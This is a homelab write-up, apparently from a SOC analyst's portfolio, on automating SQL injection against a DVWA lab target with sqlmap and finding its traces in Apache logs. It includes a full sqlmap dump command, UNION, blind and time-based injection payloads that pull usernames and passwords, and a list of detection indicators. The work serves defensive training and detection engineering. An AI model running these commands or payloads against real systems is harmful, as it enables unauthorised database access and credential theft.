# Phase 4 — Automated SQL Injection using sqlmap (Red Team + Detection Perspective)

**Project:** SQL Injection Detection Homelab  
**Author:** Didde Isaac | SOC Analyst Portfolio  
**Phase Focus:** Automated Attack Execution, Log Pattern Analysis, Manual vs Automated Comparison

---

## Overview

This phase demonstrates the use of **sqlmap** to automate SQL Injection attacks against DVWA, simulating real-world attacker behavior at scale. Unlike manual testing covered in Phase 2, sqlmap generates high-volume, complex, and multi-vector payloads — providing a significantly different traffic signature in web server logs.

The phase is analyzed from both a **Red Team perspective** (attack execution and data extraction) and a **SOC analyst perspective** (log pattern recognition and detection insights), continuing the Purple Team methodology of this project.

---

## Objectives

- Automate SQL Injection against DVWA using sqlmap
- Extract database names, tables, columns, and user data
- Generate realistic, high-volume attack traffic for log analysis
- Document how automated attack signatures differ from manual payloads
- Identify SOC-relevant detection patterns from sqlmap-generated traffic
- Map observed techniques to MITRE ATT&CK

---

## Tools & Environment

| Role | Tool |
|---|---|
| Attacker OS | Kali Linux |
| Target Application | DVWA on Ubuntu Server |
| Automation Tool | sqlmap |
| Log Source | Apache `access.log` |
| Monitoring | `tail -f` real-time log watching |

---

## Pre-Execution: Authentication Handling

DVWA requires an active authenticated session. Unauthenticated requests redirect to the login page, causing sqlmap to test the wrong endpoint. A valid session cookie must be extracted from the browser after logging in manually.

**Cookie format used:**
```
PHPSESSID=<session_id>; security=low
```

This is passed to sqlmap via the `--cookie` flag to maintain session state across all automated requests.

---

## Attack Execution

### sqlmap Command

```bash
sqlmap -u "http://192.168.0.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<session_id>; security=low" \
--dump --batch --level=3 --risk=2 \
--random-agent --flush-session
```

### Parameter Breakdown

| Parameter | Purpose | Why It Matters |
|---|---|---|
| `-u` | Target URL | Points sqlmap to the injectable endpoint |
| `--cookie` | Session authentication | Without this, requests hit the login page |
| `--dump` | Extract all accessible data | Retrieves tables, columns, and row data |
| `--batch` | Non-interactive mode | Accepts all defaults — simulates scripted attacker |
| `--level=3` | Payload coverage depth | Increases the number of injection tests per parameter |
| `--risk=2` | Aggression level | Enables time-based and heavier blind injection tests |
| `--random-agent` | Randomize User-Agent | Evades simple user-agent based detection rules |
| `--flush-session` | Clear cached state | Forces fresh enumeration, avoids stale results |

---

## Attack Behavior Observed

### 1. High-Volume Automated Requests

sqlmap sends hundreds of requests within seconds to the same endpoint, systematically varying payloads. This creates a very distinct traffic spike compared to manual testing.

**Characteristic pattern in logs:**
```
192.168.0.xxx - - [date] "GET /dvwa/vulnerabilities/sqli/?id=1... HTTP/1.1" 200
192.168.0.xxx - - [date] "GET /dvwa/vulnerabilities/sqli/?id=1... HTTP/1.1" 200
192.168.0.xxx - - [date] "GET /dvwa/vulnerabilities/sqli/?id=1... HTTP/1.1" 500
```
Rapid repetition to the same path with incrementally modified parameters is a strong automated tool indicator.

---

### 2. Complex Multi-Vector Payloads

Unlike the simple `' OR '1'='1` used manually in Phase 2, sqlmap employs multiple injection techniques simultaneously:

**UNION-based extraction:**
```sql
UNION ALL SELECT NULL, CONCAT(0x7178707871, username, 0x3a, password, 0x71786a7871) FROM users--
```

**Boolean-based blind:**
```sql
AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(...))s), 8446744073709551610, 8446744073709551610)))
```

**Time-based blind:**
```sql
AND SLEEP(5)
```

**Schema enumeration:**
```sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()
```

Each technique is used to confirm injection and extract data through different channels — making detection rules need to cover all four vectors.

---

### 3. Payload Encoding & Obfuscation

sqlmap URL-encodes payloads to bypass basic input filters. Recognizing encoded values is a critical log analysis skill:

| Encoded | Decoded | Meaning |
|---|---|---|
| `%27` | `'` | Single quote (injection delimiter) |
| `%20` | ` ` | Space character |
| `%2C` | `,` | Comma |
| `%3D` | `=` | Equals sign |
| `%2B` | `+` | Plus / alternative space |
| `0x71786a7871` | `qxjxq` | Hex-encoded string (sqlmap boundary marker) |

The use of hex encoding (`0x...`) in UNION payloads is a distinctive sqlmap fingerprint and a high-confidence detection indicator.

---

### 4. Database Enumeration Sequence

sqlmap follows a structured extraction sequence. Recognizing this order in logs reveals attacker progression:

```
Step 1: Confirm injection point
Step 2: Identify database type (MySQL, MSSQL, etc.)
Step 3: Extract current database name
Step 4: Enumerate all databases
Step 5: Enumerate tables in target database
Step 6: Enumerate columns per table
Step 7: Dump row data
```

**Extracted artifacts from this phase:**
- Database name: `dvwa`
- Tables: `users`, `guestbook`
- Columns: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`
- Data: Username and hashed password records

---

## Log Analysis

### Sample Log Entries (Annotated)

```
# Injection test — boolean based
GET /dvwa/vulnerabilities/sqli/?id=1%27+AND+1%3D1--+&Submit=Submit HTTP/1.1

# Schema enumeration
GET /dvwa/vulnerabilities/sqli/?id=1+UNION+ALL+SELECT+NULL%2CINFORMATION_SCHEMA.TABLES--

# UNION-based data extraction with hex-encoded boundaries
GET /dvwa/vulnerabilities/sqli/?id=1+UNION+ALL+SELECT+NULL%2CCONCAT(0x71786a7871%2Cusername%2C0x3a%2Cpassword%2C0x71786a7871)+FROM+users--

# Time-based blind test
GET /dvwa/vulnerabilities/sqli/?id=1%27+AND+SLEEP(5)--
```

> IP addresses partially masked (192.168.0.xxx) for privacy. Attack patterns preserved for analysis.

---

### Detection Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `UNION ALL SELECT` | Data extraction | High |
| `INFORMATION_SCHEMA` | Schema enumeration | High |
| `SLEEP(5)` / `BENCHMARK()` | Time-based blind injection | High |
| `CASE WHEN ... THEN ... ELSE` | Boolean-based blind injection | High |
| `0x7178...` hex strings | sqlmap boundary markers | High |
| Hundreds of requests in seconds | Automated tool behavior | High |
| `--random-agent` User-Agent rotation | Evasion attempt | Medium |
| `%27`, `%20`, `%2C` encoding | Payload obfuscation | Medium |

---

## Manual vs. Automated SQL Injection — Comparison

| Feature | Manual (Phase 2) | Automated (Phase 4 — sqlmap) |
|---|---|---|
| Request volume | Low (5–10 requests) | High (200–500+ requests) |
| Payload complexity | Simple (`' OR`, `UNION SELECT`) | Multi-vector (boolean, time, UNION, error-based) |
| Encoding | Minimal | Heavy (URL + hex encoding) |
| Speed | Slow (human-paced) | Very fast (seconds) |
| Data extracted | Single query results | Full database dump |
| Log footprint | Sparse, readable | Dense, encoded, repetitive |
| Detection difficulty | Easy (clear patterns) | Moderate (requires decoding + pattern matching) |
| Evasion capability | None | User-agent rotation, session handling |

---

## SOC Detection Insights

**1. Volume anomaly is the first signal.** Hundreds of requests per second to a single endpoint is abnormal regardless of payload content. Rate-based detection rules catch automated tools before payload inspection is even needed.

**2. `INFORMATION_SCHEMA` queries are never legitimate in user-facing input.** Any HTTP request containing this string should trigger an immediate high-confidence alert.

**3. Hex-encoded strings (`0x...`) in URL parameters are a strong sqlmap fingerprint.** No legitimate web application passes hex literals as user input.

**4. Time-based payloads (`SLEEP`, `BENCHMARK`) cause measurable response delays.** If log timestamps show abnormal response times on a specific endpoint, time-based SQLi should be considered.

**5. Decoding is required before analysis.** URL-encoded logs must be decoded to reveal true payload content. SIEM rules must handle both raw and encoded forms.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Automated SQL Injection against DVWA using sqlmap |
| Automated Exfiltration | T1020 | sqlmap systematically extracted all database tables and records |
| Obfuscated Files or Information | T1027 | URL and hex encoding used to obfuscate injection payloads |
| System Information Discovery | T1082 | Database version, type, and schema enumerated via `INFORMATION_SCHEMA` |

---

## Challenges & Fixes

| Issue | Root Cause | Fix Applied |
|---|---|---|
| sqlmap testing login page instead of target | Missing session cookie — requests redirected to `/login.php` | Extracted `PHPSESSID` from browser after manual login and passed via `--cookie` |
| No injection detected on first run | DVWA security level set to Medium | Changed DVWA security to LOW via Security settings page |
| Stale results from previous session | sqlmap cached previous test results | Added `--flush-session` to force fresh enumeration |
| Command syntax error with backslash | Shell not interpreting `\` as line continuation | Verified bash shell context and corrected multi-line formatting |

---

## Key Learnings

- sqlmap requires proper session management — unauthenticated tool runs test the wrong surface
- Automated tools use multiple injection techniques in parallel; detection rules must cover all vectors
- Hex encoding in URL parameters is a reliable, high-confidence sqlmap fingerprint
- Volume-based detection (requests per second) catches automation before payload inspection
- The `INFORMATION_SCHEMA` string in any HTTP request parameter is an unambiguous attack indicator
- Understanding tool behavior at the log level builds stronger detection intuition than rule-copying

---

## Next Phase

**Phase 5 — SIEM Integration (Wazuh):** Forward Apache access logs to Wazuh, build custom detection rules for the attack patterns observed in Phase 2, 3, and 4, generate alerts, and simulate a full SOC investigation workflow.

---
